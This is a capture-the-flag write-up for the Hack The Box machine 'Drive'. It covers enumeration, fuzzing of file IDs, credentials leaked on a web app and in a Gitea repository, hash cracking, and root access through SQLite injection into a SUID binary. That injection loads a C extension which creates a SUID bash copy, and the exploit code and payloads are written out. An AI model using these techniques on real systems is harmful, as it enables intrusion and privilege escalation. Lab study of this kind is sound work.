# HTB - Drive

### TL;DR
This is an Ubuntu 20.04 host running a custom web app called doodleGrive which is used to share and edit files. A clear text password is uploaded into the tool which can be used to get an initial foothold. An internal gitea server, used for config control, also contains clear text password which allows accessing database backups. For privilege escalation, reversing in a local binary and sqlite insjection are needed. To get code execution, the sqlite `load_extensions()` function is used.

__Keywords:__<br>
gitea, port forwarding, reversing, ghidra, c, sqlite injection, load_extensions()<br>

__References:__<br>
https://hashcat.net/wiki/doku.php?id=example_hashes<br>
https://www.sqlite.org/loadext.html<br>
https://www.w3resource.com/sqlite/core-functions-char.php<br>
https://www.sqlite.org/loadext.html<br>
<br>
### PHASE 1. Service enumeration
Launch a port scan with `nmap`
```markdown
> nmap $target -p- -T4 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-14 15:20 EDT
Stats: 0:03:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Nmap scan report for 10.129.236.186
Host is up, received user-set (0.35s latency).
Not shown: 33294 filtered tcp ports (no-response), 32239 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Nmap done: 1 IP address (1 host up) scanned in 194.37 seconds
```
Enumerate open ports
```markdown
> nmap $target -p22,80 -sV -sC -Pn -vv    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-14 15:24 EDT

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 275a9fdb91c316e57da60d6dcb6bbd4a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyyCDYN041kanjaSvUxqW5SenLxm0d0OeKT63VFnPxosvShWWbaEg96sDQ96DjFBFwPUco6uWREVp/Iqbr4pU+CyuzuGgvyHSkluruW386eCUwHyigizK98wPLpZWDc50xXJjUV+lSbczNrO8K4IgFgB6PxoXrw3nl9/lsJEH2dlZn/cwD78CO5/lrx4EowSky2dFPjpIGhM6bWHe1iKugD9Jlyq66f5Cw3B1Kszr5HgdiMCYpw3ykfpeRbcNL0pWn1AN9KeBkIJGNpzJ9RPj1YB0s5i9LPdcq64gyhrCmcfl3yYukq4R5OLuHRbbnc7TZHT3zHSkx9uln0QDDEL7CGGZbtRpPj2D++jjDuIK/mtaWGerjgHonX0RA/IPACyEYv01C6J5hjpuQGqJvbldtz9wOS7hJUgYx/MH2n2N8r0pSOIYQL7KxkFZ72w7WiQGktRt+Jzj5QvAXhbtXpkY9rhib7DL1lLMv5VBE5YAwuwQutbSUYAtZKSG57xwVPhU=
|   256 9d076bc847280df29f81f2b8c3a67853 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCnF1ZLcx/U/Eo2AMywmmrEXFf3MKF6k2oelVjHswAvYtAqk0Nbv8SCQF9gpR/EkDvoSF0bBIoovBnk2bHDT6SI=
|   256 1d30349f797369bdf667f3343c1ff94e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPJ60hQRxnk2iSpqzRQ4g/dd6SQFrOXnu/gN0SU2f4U/
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://drive.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 12.32 seconds
```
Enumerate the site with firefox. Register a new account, and spend some time understanding what its functionality is. You can upload files, reserve them, edit them, assign to teams, etc. Note that when a file is uploaded, a 3-digit folder is created (e.g. http://drive.htb/122/getFileDetail).

![drive1](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/c89be0c3-f428-4a9d-b670-554223986399)

Also note that when reserving a file, the same 3-digit folder is used (e.g. http://drive.htb/122/block).

![drive2](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/4292a3b4-6520-455e-a203-a2f3c0fd1782)

Let's list all blocked files fuzzing the 3-digit field. For this, first capture a block file request with burpsuite, then right-click + copy and paste in a file called `request.txt`.

![drive3](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/b9fc1566-b8f8-464d-98fa-2f899cb4aa35)

In bash, edit the `request.txt` file to prepare it for `ffuf`. Edit with `vim` the 3-digit field we want to fuzz and save the field as `request.txt`.

![drive4](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/25cf2e7d-c56d-49f1-b18b-8019f33f39e3)

Prepare a wordlist with 200 items and launch `ffuf` using the `request.txt` file. Several documents are found.
```markdown
> seq 1 200 > fuzz

> ffuf -c -request request.txt -request-proto http -t 100 -w ./fuzz
101                     [Status: 200, Size: 1927, Words: 3, Lines: 4]
115                     [Status: 200, Size: 2167, Words: 7, Lines: 12]
121                     [Status: 200, Size: 1952, Words: 6, Lines: 8]
122                     [Status: 200, Size: 3338, Words: 12, Lines: 19]
123                     [Status: 200, Size: 3302, Words: 15, Lines: 19]
99                      [Status: 200, Size: 1734, Words: 5, Lines: 8]
98                      [Status: 200, Size: 1718, Words: 8, Lines: 10]
100                     [Status: 200, Size: 1746, Words: 6, Lines: 5]
79                      [Status: 200, Size: 1923, Words: 5, Lines: 13]
:: Progress: [200/200] :: Job [1/1] :: 11 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```
Just browse the sites to find credentials for user `martin: Xk4@KjyrYv8t194L!`

![drive5](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/dc58e510-5ab4-446f-8710-4443698feddb)

Also, info related to the database is disclosed. Apparently, there is a scheduled daily backup plan where database is compressed and copied to `/var/www/backups/`. Backup will be protected with strong password.

Finally, enumerating the site we can alsso find a list of potential usernames (creating a group and then clicking on `edit group`).
```markdown
admin
jamesMason
martinCruz
tomHands
crisDisel
```
We will use this user list later.
<br>
<br>
### PHASE 2. User
Just use martin's credentials to ssh in. First task is to enumerate system users. We see root is `uid=0`, git is `uid=115`, martin is `uid=1001`, cris is `uid=1002` and tom is `uid=1003`.

![drive6](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/b85d4b33-654f-431d-8e78-72c23008f533)

Scanning processes with `pspy64`, we find a gitea web server running under the context of user git `uid=115`. This service was not discovered with nmap, so maybe it is an internal service.

![drive7](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/0d4557e7-ab9e-4917-b32a-2009282a6a4f)

In fact the web server is running internally on port 3000.

![drive8](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/f8897ca1-13e7-48ea-b325-9f098862ceba)

Let's forward port 3000 to our machine.
```markdown
> ssh -f -N -L 3000:127.0.0.1:3000 martin@drive.htb
```
Now we can browse the gitea server on http://localhost:3000, where martin's credentials are accepted. For this tool martin's username is `martinCruz`, as we found in the previous step.

![drive9](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/55675377-7b34-4cbe-8dab-ecec3fdf6245)

In the DoodleGrive repository there is the database encryption script `db_backup.sh`, and the key they used to compress the 7z files. The password is `H@ckThisP@ssW0rDIfY0uC@n:)`
To unzio the files, first copy the files to kali using `scp`, then unzip using the password.
```markdown
> scp martin@drive.htb:/var/www/backups/1_Sep_db_backup.sqlite3.7z ~/htb/drive
martin@drive.htb's password: 
1_Sep_db_backup.sqlite3.7z                                           100%   12KB  13.9KB/s   00:00

> 7z e -p 'H@ckThisP@ssW0rDIfY0uC@n:)' 1_Sep_db_backup.sqlite3.7z
```
Connect to the databases extracted using the `sqlite3` command line, and once inside the database, find a table called `accounts_customuser`. Dump the table to get some django sha1 hashes.
```markdown
sqlite db.sqlite3
.tables
select * from accounts_customuser;
```

![drive10](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/f9ffde93-4a2c-42b3-903d-bbd556d085e5)

To crack these hashes, refer to hashcat documentation (https://hashcat.net/wiki/doku.php?id=example_hashes). Searching in the documentation for the hashes beginning with `sha1$`, we find out that its correspondent hashcat module is 124.
 
![drive11](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/f59935c2-19db-42e0-8c19-7486b1161026)

Testing the cracked passwords, we find out the credentials working for the user tom are `tom:johnmayer7`. Login using ssh and get the `user.txt`
<br>
<br>
### PHASE 3. System
Enumerate the system.
```markdown
> uname -a
Linux drive 5.4.0-164-generic #181-Ubuntu SMP Fri Sep 1 13:41:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

> cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
```
Inside tom's home folder, there is a binary called `doodleGrive-cli` with suid permissions. Since owner is root, it will be executed under the root context any time we run it. It seems it needs credentials to execute.
In order to get to know how the binary works, the best is to reverse engineer the binary with `ghidra`. Open the application, add the binaries and let the tool analyze the source code. Turns out the application is written in c, and inspecting the `main()` function we find out the credentials to run the binary are hardcoded in the source code.

![drive12](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/c5664000-6897-490f-b518-1d48e5c07a67)

The credentials to run the binary are `moriarty:findMeIfY0uC@nMr.Holmz!`
Navigating to the `main_menu()` function we find the calls to the functions presented in the menu. The most interesting is the function called `activate_user_account()`

![drive13](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/7c0a1627-0f42-454c-80a6-58e6593a73f0)

Navigating to the function `activate_user_account()` we find out several interesting things. First, we discover the app only reads the first 40 (0x28) characters from user's input. Secondly, application sanitizes the user input (function `sanitize_string()`). Finally, we can see the sqllite sql request used to update the database with the user's input:
```markdown
UPDATE accounts_customuser SET is_active=1 WHERE username=\"%s\";
```
Tthe `%s` represents the user's input parameter, note that the backslashes `\` are just to escape the quotes. So in theory we could inject a sql statement as long as starts with quotes and finishes with comment dashes.
```markdown
" <sqlite statement here>;--
```

![drive14](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/d42acdb1-c351-426e-9eab-78e91ab69529)

But first we have to inspect the sanitization function to check what we can enter and what not. 

![drive16](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/11f19fae-edae-4fac-96ec-ec0d8f93667e)

We see the function removes several characters and replaces them with a null character `\0`. The forbidden characters include `\/{|'` along with spaces and null chars. Good news are dashes and quotes are not filtered.

![drive15](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/d7f3bd8f-00be-4a01-bfdd-4c6732067693)

The next goal is to investigate how to gain command execution using sqlite statements. This can be done using `load_extensions()` functions. Basically, this feature allows to load c code compiled as a `.so` shared library. In the link https://www.sqlite.org/loadext.html you can find instructions to compile the source code.
First step is to generate a c payload load extension called `le.c`
```c
# include <stdio.h>
# include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
     system("/usr/bin/cp /bin/bash /var/tmp/bs && /usr/bin/chmod 4777 /var/tmp/bs");
}
```
Next, compile following sqlite documentation.
```markdown
gcc -g -shared -fPIC ./le.c -o ./le.so
```
Now we have to create a sql injection to load the extension but keeping in mind the 40-char limitation and the forbidden characters. The final payload could be something like this.
```markdown
" load_extensions(./le.so);--
```
However, this won't work because it contains forbidden chars. This can be bypassed using the sqlite3 function `char()` which translates characters from ascii code (https://www.w3resource.com/sqlite/core-functions-char.php). After doing some tests with an ascii table and `wc -c` to fine tune the payload, we find a workable injection.
```markdown
"+load_extension(char(46,47,108,101))--
```

![drive17](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/9522c098-6d13-4726-97a4-e4aa0a1513bb)

Final steps are injecting the payload in the tool.

![drive18](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/5c288903-b57a-4798-91cd-5c48cfee8c22)

And checking that everything went well.

![drive19](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/d4758acc-80ec-455f-b55c-289120834168)

A system `cmd` spawns.
